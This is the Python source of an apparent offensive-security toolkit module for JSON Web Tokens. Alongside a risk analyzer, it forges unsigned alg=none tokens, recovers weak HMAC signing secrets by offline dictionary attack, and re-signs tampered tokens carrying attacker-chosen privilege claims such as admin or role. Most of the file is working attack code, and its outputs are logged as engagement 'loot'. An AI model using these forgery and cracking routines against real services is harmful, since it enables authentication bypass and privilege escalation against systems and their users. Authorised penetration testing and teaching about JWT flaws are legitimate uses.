"""JWT (JSON Web Token) analysis / attack toolkit.

Fully OFFLINE cryptography using only ``base64``, ``hmac`` and ``hashlib``
from the standard library -- no network calls are made by this module at all
(the token is supplied by the operator, not fetched). It covers the common
JWT-attack playbook against HS256/384/512-signed tokens:

    * ``analyze`` -- decode header + payload, flag risky configuration
      (``alg: none``, weak/absent signature, expired/missing ``exp``,
      sensitive claims, SSRF/inclusion-prone header fields such as
      ``jku``/``x5u``/``kid``).
    * ``none``    -- forge an ``alg: none`` token with an empty signature,
      the classic "algorithm confusion" bypass.
    * ``brute``   -- offline dictionary attack recovering a weak HMAC secret
      by recomputing the signature for every candidate in a wordlist.
    * ``sign``    -- re-sign the (optionally claim-merged) payload with an
      operator-supplied secret.
    * ``tamper``  -- merge attacker-controlled claims into the payload and
      re-sign (with the supplied secret, or fall back to ``alg: none`` when
      no secret is given).

Design constraints (redkit invariants):
    * NO AI/LLM usage -- every decision here is a deterministic rule.
    * Pure standard library only; no HttpClient / network needed.
    * Imports and runs identically on Windows and Linux.
    * Offline-first: the brute-force wordlist is bundled under
      ``redkit.core.config``; nothing is ever downloaded.
    * Bounded: the wordlist is capped and every step tolerates malformed
      input without raising.
"""
from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import json
import time
import urllib.parse
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from redkit.core.module import Module, Option, Result
from redkit.core.registry import register
from redkit.core import config

# --------------------------------------------------------------------------- #
# constants
# --------------------------------------------------------------------------- #
MAX_BRUTE_CANDIDATES = 200_000  # hard cap on wordlist size actually tried

_HS_ALGS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}

# claim names that, if present/truthy, are worth flagging for the operator
_SENSITIVE_CLAIM_NAMES = ("role", "admin", "isadmin", "is_admin", "roles", "scope", "scopes", "permissions")

# header fields that can be abused for SSRF or key-source confusion
_SSRF_HEADER_FIELDS = ("jku", "x5u")


# --------------------------------------------------------------------------- #
# base64url helpers
# --------------------------------------------------------------------------- #
def b64url_decode(segment: str) -> bytes:
    """Decode a base64url segment, tolerating missing padding."""
    segment = segment.strip()
    padded = segment + "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(padded.encode("ascii"))


def b64url_encode(data: bytes) -> str:
    """Encode bytes as base64url with padding stripped (JWS convention)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_encode_json(obj: Dict[str, Any]) -> str:
    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    return b64url_encode(raw)


# --------------------------------------------------------------------------- #
# token parsing
# --------------------------------------------------------------------------- #
class TokenParseError(Exception):
    pass


def split_token(token: str) -> Tuple[str, str, str]:
    """Split a compact JWS into (header_b64, payload_b64, signature_b64).

    Raises :class:`TokenParseError` on anything that is not a 3-part
    dot-separated string.
    """
    parts = (token or "").strip().split(".")
    if len(parts) != 3:
        raise TokenParseError(f"expected 3 dot-separated segments, got {len(parts)}")
    header_b64, payload_b64, sig_b64 = parts
    if not header_b64 or not payload_b64:
        raise TokenParseError("empty header or payload segment")
    return header_b64, payload_b64, sig_b64


def decode_part(segment: str) -> Tuple[Optional[Dict[str, Any]], Optional[str]]:
    """Best-effort decode of a base64url JSON segment.

    Returns ``(obj, error)`` -- exactly one of them is non-``None``.
    """
    try:
        raw = b64url_decode(segment)
    except (binascii.Error, ValueError) as exc:
        return None, f"base64 decode failed: {exc}"
    try:
        obj = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        return None, f"JSON decode failed: {exc}"
    if not isinstance(obj, dict):
        return None, "decoded JSON is not an object"
    return obj, None


def signing_input(header_b64: str, payload_b64: str) -> bytes:
    return f"{header_b64}.{payload_b64}".encode("ascii")


def hmac_sign(secret: str, header_b64: str, payload_b64: str, alg: str) -> Optional[str]:
    digestmod = _HS_ALGS.get((alg or "").upper())
    if digestmod is None:
        return None
    mac = hmac.new(secret.encode("utf-8"), signing_input(header_b64, payload_b64), digestmod)
    return b64url_encode(mac.digest())


def parse_claims_option(raw: str) -> Dict[str, Any]:
    """Parse the operator-supplied ``claims`` JSON string; '' -> {}.

    Never raises: malformed JSON simply yields an empty dict (caller can see
    this reflected in ``data['claims_parse_error']``).
    """
    raw = (raw or "").strip()
    if not raw:
        return {}
    try:
        obj = json.loads(raw)
    except json.JSONDecodeError:
        return {}
    return obj if isinstance(obj, dict) else {}


# --------------------------------------------------------------------------- #
# wordlist loading (offline-first, mirrors recon.web_enum's approach)
# --------------------------------------------------------------------------- #
def _load_words(path: Path) -> List[str]:
    words: List[str] = []
    seen: set = set()
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                word = line.strip()
                if not word or word.startswith("#"):
                    continue
                if word not in seen:
                    seen.add(word)
                    words.append(word)
    except OSError:
        return []
    return words


def _resolve_wordlist(name: str, console) -> List[str]:
    name = (name or "").strip() or "jwt-secrets.txt"
    candidates: List[Path] = []
    raw = Path(name)
    if raw.is_absolute() or raw.exists():
        candidates.append(raw)
    candidates.append(config.wordlist(name))
    for path in candidates:
        try:
            if path.exists():
                words = _load_words(path)
                if words:
                    if len(words) > MAX_BRUTE_CANDIDATES:
                        console.warn(
                            f"wordlist has {len(words)} entries; capping brute-force at {MAX_BRUTE_CANDIDATES}"
                        )
                        words = words[:MAX_BRUTE_CANDIDATES]
                    return words
        except OSError:
            continue
    console.warn(f"wordlist '{name}' not found (looked in cwd and bundled data)")
    return []


# --------------------------------------------------------------------------- #
# analysis helpers
# --------------------------------------------------------------------------- #
def _fmt_ts(value: Any) -> str:
    try:
        return time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(float(value)))
    except (TypeError, ValueError, OSError, OverflowError):
        return str(value)


def analyze_token(header: Optional[Dict[str, Any]], payload: Optional[Dict[str, Any]], sig_b64: str) -> List[Dict[str, str]]:
    """Return a list of {title, severity, description} risk findings.

    Pure/deterministic -- no I/O. Kept separate from ``run`` so it is easy to
    unit-test and reuse from ``tamper``/``none`` for consistent reporting.
    """
    findings: List[Dict[str, str]] = []
    header = header or {}
    payload = payload or {}

    alg = str(header.get("alg", "")).strip()
    alg_upper = alg.upper()

    if alg_upper in ("NONE", ""):
        findings.append({
            "title": "JWT uses alg=none (unsigned token accepted)",
            "severity": "high",
            "description": f"Header declares alg={alg or '(missing)'}; if the server accepts this, "
                            "signature verification can be bypassed entirely.",
        })
    elif not sig_b64.strip():
        findings.append({
            "title": "JWT signature segment is empty",
            "severity": "high",
            "description": f"alg={alg} but no signature bytes are present on the wire.",
        })

    if "exp" not in payload:
        findings.append({
            "title": "JWT has no expiry (exp) claim",
            "severity": "medium",
            "description": "Token never expires; if leaked it remains valid indefinitely.",
        })
    else:
        try:
            exp = float(payload["exp"])
            if exp < time.time():
                findings.append({
                    "title": "JWT is expired",
                    "severity": "low",
                    "description": f"exp={payload['exp']} ({_fmt_ts(payload['exp'])}) is in the past.",
                })
        except (TypeError, ValueError):
            findings.append({
                "title": "JWT exp claim is malformed",
                "severity": "low",
                "description": f"exp={payload.get('exp')!r} is not a numeric timestamp.",
            })

    sensitive_hit = [k for k in payload if k.lower() in _SENSITIVE_CLAIM_NAMES]
    if sensitive_hit:
        findings.append({
            "title": "JWT carries sensitive/privilege claims",
            "severity": "medium",
            "description": "Claim(s) " + ", ".join(sorted(sensitive_hit)) +
                            " may grant privilege if the client trusts an unverified/weakly-verified token.",
        })

    ssrf_hit = [k for k in _SSRF_HEADER_FIELDS if k in header]
    if ssrf_hit:
        findings.append({
            "title": "JWT header references an external key source (" + "/".join(ssrf_hit) + ")",
            "severity": "high",
            "description": "jku/x5u instruct the verifier to fetch a key from an attacker-influenceable URL "
                            "-- classic JWT SSRF / key-confusion vector: " +
                            ", ".join(f"{k}={header[k]!r}" for k in ssrf_hit),
        })
    if "kid" in header:
        kid = str(header.get("kid", ""))
        risky_kid = any(ch in kid for ch in ("/", "\\", "..", "'", '"', ";", "|"))
        findings.append({
            "title": "JWT header sets 'kid' (key id)",
            "severity": "medium" if risky_kid else "info",
            "description": f"kid={kid!r} selects the verification key server-side; if attacker-influenced "
                            "this enables path traversal / SQLi / command-injection into key lookup"
                            + (" (suspicious characters present)" if risky_kid else "") + ".",
        })

    if alg_upper.startswith("HS") and alg_upper not in _HS_ALGS:
        findings.append({
            "title": f"Unrecognized HMAC-family alg '{alg}'",
            "severity": "low",
            "description": "Only HS256/HS384/HS512 are handled by this module's brute-forcer.",
        })
    if alg_upper.startswith("RS") or alg_upper.startswith("ES") or alg_upper.startswith("PS"):
        findings.append({
            "title": f"JWT uses asymmetric alg '{alg}' -- check for RS/HS confusion",
            "severity": "info",
            "description": "If a server verifies HS256 tokens with the RSA/EC public key as the HMAC secret, "
                            "a token can be forged by signing with the (often obtainable) public key text.",
        })

    return findings


# --------------------------------------------------------------------------- #
# module
# --------------------------------------------------------------------------- #
@register
class JwtToolkit(Module):
    """Offline JWT analysis, forgery, dictionary attack, and re-signing."""

    name = "web.jwt"
    description = "JWT toolkit: analyze, forge alg=none, brute-force HMAC secret, sign/tamper claims (fully offline)"
    phase = "web"
    options = [
        Option("token", help="the JWT to operate on (header.payload.signature)", required=True),
        Option(
            "action",
            default="analyze",
            choices=["analyze", "none", "brute", "sign", "tamper"],
            help="analyze | none (forge alg=none) | brute (crack HMAC secret) | sign | tamper",
        ),
        Option("secret", default="", help="HMAC key used by 'sign'/'tamper' (and as an extra brute candidate)"),
        Option("wordlist", default="jwt-secrets.txt", help="bundled wordlist name or path, used by 'brute'"),
        Option("claims", default="", help="JSON object of claims to merge, used by 'tamper' (and optionally 'none'/'sign')"),
    ]
    references = [
        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
        "https://portswigger.net/web-security/jwt",
        "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
        "https://datatracker.ietf.org/doc/html/rfc7519",
    ]

    # ---------------------------------------------------------------- run -- #
    def run(self, opts: Dict[str, Any], ctx) -> Result:
        console = ctx.console
        token = str(opts["token"] or "").strip()
        action = str(opts["action"] or "analyze").lower()

        try:
            header_b64, payload_b64, sig_b64 = split_token(token)
        except TokenParseError as exc:
            console.bad(f"malformed token: {exc}")
            return Result(ok=False, summary=f"malformed JWT: {exc}", data={"token": token})

        header, header_err = decode_part(header_b64)
        payload, payload_err = decode_part(payload_b64)

        host = self._infer_host(payload)

        data: Dict[str, Any] = {
            "action": action,
            "header": header,
            "payload": payload,
            "header_error": header_err,
            "payload_error": payload_err,
            "signature_b64": sig_b64,
            "alg": (header or {}).get("alg"),
        }

        if header is None:
            console.bad(f"could not decode header: {header_err}")
            ctx.engagement.add_finding(
                "JWT header could not be decoded",
                severity="low",
                host=host,
                description=header_err or "unknown decode error",
                evidence=token[:120],
            )
        if payload is None:
            console.bad(f"could not decode payload: {payload_err}")
            ctx.engagement.add_finding(
                "JWT payload could not be decoded",
                severity="low",
                host=host,
                description=payload_err or "unknown decode error",
                evidence=token[:120],
            )

        console.info(f"JWT action={action}  alg={data['alg']!r}  kid={(header or {}).get('kid')!r}")

        dispatch = {
            "analyze": self._do_analyze,
            "none": self._do_none,
            "brute": self._do_brute,
            "sign": self._do_sign,
            "tamper": self._do_tamper,
        }
        handler = dispatch.get(action)
        if handler is None:  # unreachable given Option.choices, but stay defensive
            return Result(ok=False, summary=f"unknown action: {action}", data=data)

        return handler(opts, ctx, header, payload, header_b64, payload_b64, sig_b64, host, data)

    # ------------------------------------------------------------ analyze -- #
    def _do_analyze(self, opts, ctx, header, payload, header_b64, payload_b64, sig_b64, host, data) -> Result:
        console = ctx.console
        findings = analyze_token(header, payload, sig_b64)
        data["findings"] = findings

        if header:
            console.raw(f"    header : {json.dumps(header, ensure_ascii=False)}")
        if payload:
            console.raw(f"    payload: {json.dumps(payload, ensure_ascii=False)}")

        for f in findings:
            sev = f["severity"]
            emit = console.bad if sev in ("high", "critical") else console.warn if sev == "medium" else console.info
            emit(f"{f['title']} [{sev}]")
            ctx.engagement.add_finding(
                f["title"], severity=sev, host=host, description=f["description"], evidence=data.get("signature_b64") or None,
            )

        summary = f"analyzed JWT: alg={data.get('alg')!r}, {len(findings)} finding(s)"
        return Result(ok=True, summary=summary, data=data)

    # --------------------------------------------------------------- none -- #
    def _do_none(self, opts, ctx, header, payload, header_b64, payload_b64, sig_b64, host, data) -> Result:
        console = ctx.console
        base_payload = dict(payload or {})
        merged_claims = parse_claims_option(str(opts.get("claims", "")))
        if merged_claims:
            base_payload.update(merged_claims)
        data["claims_merged"] = merged_claims

        new_header = dict(header or {})
        new_header["alg"] = "none"
        new_header.pop("typ", None)
        new_header["typ"] = (header or {}).get("typ", "JWT")

        new_header_b64 = b64url_encode_json(new_header)
        new_payload_b64 = b64url_encode_json(base_payload)
        forged = f"{new_header_b64}.{new_payload_b64}."  # empty signature segment

        data["forged_token"] = forged
        data["forged_header"] = new_header
        data["forged_payload"] = base_payload

        console.bad(f"forged alg=none token: {forged}")
        ctx.engagement.add_finding(
            "Forged JWT with alg=none (unsigned)",
            severity="high",
            host=host,
            description="A syntactically-valid, unsigned token was forged by setting header.alg=none and "
                         "emitting an empty signature segment. If the verifier accepts alg=none this is a "
                         "full authentication bypass." + (f" Merged claims: {merged_claims}" if merged_claims else ""),
            evidence=forged,
        )
        ctx.engagement.add_loot(host, "jwt-forged", forged, source="web.jwt:none")

        return Result(ok=True, summary="forged alg=none token", data=data, artifacts=[])

    # -------------------------------------------------------------- brute -- #
    def _do_brute(self, opts, ctx, header, payload, header_b64, payload_b64, sig_b64, host, data) -> Result:
        console = ctx.console
        alg = str((header or {}).get("alg", "")).upper()

        if alg not in _HS_ALGS:
            msg = f"alg={alg or '(none)'} is not an HS256/384/512 HMAC -- nothing to brute-force"
            console.warn(msg)
            data["cracked"] = False
            return Result(ok=False, summary=msg, data=data)

        if not sig_b64.strip():
            msg = "token has no signature to verify against"
            console.warn(msg)
            data["cracked"] = False
            return Result(ok=False, summary=msg, data=data)

        try:
            target_sig = b64url_decode(sig_b64)
        except (binascii.Error, ValueError) as exc:
            msg = f"could not decode signature segment: {exc}"
            console.bad(msg)
            data["cracked"] = False
            return Result(ok=False, summary=msg, data=data)

        words = _resolve_wordlist(str(opts.get("wordlist", "")), console)
        extra_secret = str(opts.get("secret", "") or "").strip()
        candidates = ([extra_secret] if extra_secret else []) + words
        # de-dupe while preserving order (operator-supplied secret tried first)
        seen: set = set()
        candidates = [c for c in candidates if c and not (c in seen or seen.add(c))]

        if not candidates:
            msg = "no candidate secrets available (empty wordlist and no 'secret' option)"
            console.warn(msg)
            data["cracked"] = False
            return Result(ok=False, summary=msg, data=data)

        console.info(f"brute-forcing {alg} secret against {len(candidates)} candidate(s)")
        digestmod = _HS_ALGS[alg]
        msg_bytes = signing_input(header_b64, payload_b64)

        cracked: Optional[str] = None
        tried = 0
        for candidate in candidates:
            tried += 1
            mac = hmac.new(candidate.encode("utf-8"), msg_bytes, digestmod).digest()
            if hmac.compare_digest(mac, target_sig):
                cracked = candidate
                break

        data["candidates_tried"] = tried
        data["cracked"] = cracked is not None

        if cracked is not None:
            console.bad(f"JWT HMAC secret cracked: {cracked!r} (after {tried} attempt(s))")
            data["secret"] = cracked
            ctx.engagement.add_finding(
                "JWT HMAC secret cracked",
                severity="critical",
                host=host,
                description=f"The {alg} signing secret was recovered via offline dictionary attack "
                             f"after {tried} attempt(s). Any token can now be forged with any claims.",
                evidence=f"secret={cracked!r}",
            )
            ctx.engagement.add_loot(host, "jwt-secret", cracked, source="web.jwt:brute")
            summary = f"cracked {alg} secret after {tried} attempt(s)"
            return Result(ok=True, summary=summary, data=data)

        console.info(f"no match after {tried} attempt(s)")
        summary = f"secret not found among {tried} candidate(s)"
        return Result(ok=False, summary=summary, data=data)

    # ---------------------------------------------------------------- sign -- #
    def _do_sign(self, opts, ctx, header, payload, header_b64, payload_b64, sig_b64, host, data) -> Result:
        console = ctx.console
        secret = str(opts.get("secret", "") or "")
        if not secret:
            msg = "'secret' option is required for action=sign"
            console.warn(msg)
            return Result(ok=False, summary=msg, data=data)

        base_payload = dict(payload or {})
        merged_claims = parse_claims_option(str(opts.get("claims", "")))
        if merged_claims:
            base_payload.update(merged_claims)
        data["claims_merged"] = merged_claims

        new_header = dict(header or {})
        alg = str(new_header.get("alg") or "HS256").upper()
        if alg not in _HS_ALGS:
            console.warn(f"alg={alg} unsupported for signing; defaulting to HS256")
            alg = "HS256"
        new_header["alg"] = alg

        new_header_b64 = b64url_encode_json(new_header)
        new_payload_b64 = b64url_encode_json(base_payload)
        new_sig = hmac_sign(secret, new_header_b64, new_payload_b64, alg)
        signed = f"{new_header_b64}.{new_payload_b64}.{new_sig}"

        data["signed_token"] = signed
        data["signed_header"] = new_header
        data["signed_payload"] = base_payload

        console.good(f"re-signed token ({alg}): {signed}")
        ctx.engagement.add_note(f"web.jwt: re-signed token with operator-supplied {alg} secret")
        ctx.engagement.add_loot(host, "jwt-signed", signed, source="web.jwt:sign")

        return Result(ok=True, summary=f"re-signed with {alg}", data=data)

    # -------------------------------------------------------------- tamper -- #
    def _do_tamper(self, opts, ctx, header, payload, header_b64, payload_b64, sig_b64, host, data) -> Result:
        console = ctx.console
        merged_claims = parse_claims_option(str(opts.get("claims", "")))
        if not merged_claims:
            console.warn("action=tamper with an empty/invalid 'claims' JSON -- payload will be re-signed unchanged")

        base_payload = dict(payload or {})
        base_payload.update(merged_claims)
        data["claims_merged"] = merged_claims

        secret = str(opts.get("secret", "") or "")
        new_header = dict(header or {})

        if secret:
            alg = str(new_header.get("alg") or "HS256").upper()
            if alg not in _HS_ALGS:
                console.warn(f"alg={alg} unsupported for signing; defaulting to HS256")
                alg = "HS256"
            new_header["alg"] = alg
            new_header_b64 = b64url_encode_json(new_header)
            new_payload_b64 = b64url_encode_json(base_payload)
            new_sig = hmac_sign(secret, new_header_b64, new_payload_b64, alg)
            tampered = f"{new_header_b64}.{new_payload_b64}.{new_sig}"
            method = f"re-signed ({alg}) with supplied secret"
        else:
            new_header["alg"] = "none"
            new_header.pop("typ", None)
            new_header["typ"] = (header or {}).get("typ", "JWT")
            new_header_b64 = b64url_encode_json(new_header)
            new_payload_b64 = b64url_encode_json(base_payload)
            tampered = f"{new_header_b64}.{new_payload_b64}."
            method = "forged with alg=none (no secret supplied)"

        data["tampered_token"] = tampered
        data["tampered_header"] = new_header
        data["tampered_payload"] = base_payload
        data["tamper_method"] = method

        console.bad(f"tampered token ({method}): {tampered}")
        ctx.engagement.add_finding(
            "Tampered JWT with attacker-controlled claims",
            severity="high" if not secret else "medium",
            host=host,
            description=f"Claims merged: {merged_claims}. Token was {method}.",
            evidence=tampered,
        )
        ctx.engagement.add_loot(host, "jwt-tampered", tampered, source="web.jwt:tamper")

        return Result(ok=True, summary=f"tampered token: {method}", data=data)

    # -------------------------------------------------------------- utils -- #
    @staticmethod
    def _infer_host(payload: Optional[Dict[str, Any]]) -> Optional[str]:
        """Best-effort host for engagement bookkeeping (JWT itself is offline).

        Looks at common claims (``iss``, ``aud``) that sometimes carry a URL,
        so findings still land against a meaningful host when possible.
        """
        if not payload:
            return None
        for key in ("iss", "aud"):
            value = payload.get(key)
            if isinstance(value, list):
                value = value[0] if value else None
            if isinstance(value, str) and "://" in value:
                try:
                    host = urllib.parse.urlparse(value).hostname
                    if host:
                        return host
                except ValueError:
                    continue
        return None
